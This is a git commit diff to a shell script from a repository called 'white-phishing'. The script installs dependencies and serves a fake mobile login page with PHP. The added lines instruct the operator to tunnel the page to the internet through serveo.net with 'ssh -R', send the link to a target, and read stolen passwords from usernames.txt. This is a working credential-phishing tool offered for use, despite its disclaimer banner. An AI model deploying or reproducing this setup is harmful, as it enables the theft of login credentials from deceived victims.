71411fbd4ab01af7b1c53601f6ab0e244c956e5e
whitetigerz <50932142+whitetigerz@users.noreply.github.com>
2019-10-27 04:56:45 -0700

    Update wtph.sh

--- wtph.sh
+++ wtph.sh
@@ -2,6 +2,7 @@ cd
 cd white-phishing
 apt update
 apt upgrade
+apt install openssh
 apt install git
 apt install php
 apt install python
@@ -11,6 +12,11 @@ gem install lolcat
 echo -e "\033[1m \e[32 SHELL EXECUTING......please wait" |lolcat|lolcat
 echo -e "\033[1m \e[32 script executing" |lolcat|lolcat
 echo -e "\033[1m \e[32 DONT USE THIS FOR ILLEGAL PURPOSE" |lolcat|lolcat
-echo -e "\033[1m \e[32 SCRIPT WAS MADE BY PRINCE YASIN" |lolcat|lolcat
+echo -e "\033[1m \e[32 OPEN NEW SESSION " |lolcat|lolcat
+echo -e "\033[1m \e[32 and type this command " |lolcat|lolcat
+echo -e "\033[1m \e[32 ssh -R 80:localhost:4449 serveo.net" |lolcat|lolcat
+echo -e "\033[1m \e[32 and send green link to target" |lolcat|lolcat
+echo -e "\033[1m \e[32 if target will login" |lolcat|lolcat
+echo -e "\033[1m \e[32 then to see the password open usernames.txt file" |lolcat|lolcat
 figlet WT-PHISH |lolcat|lolcat
 php -S localhost:4449/mobile.html
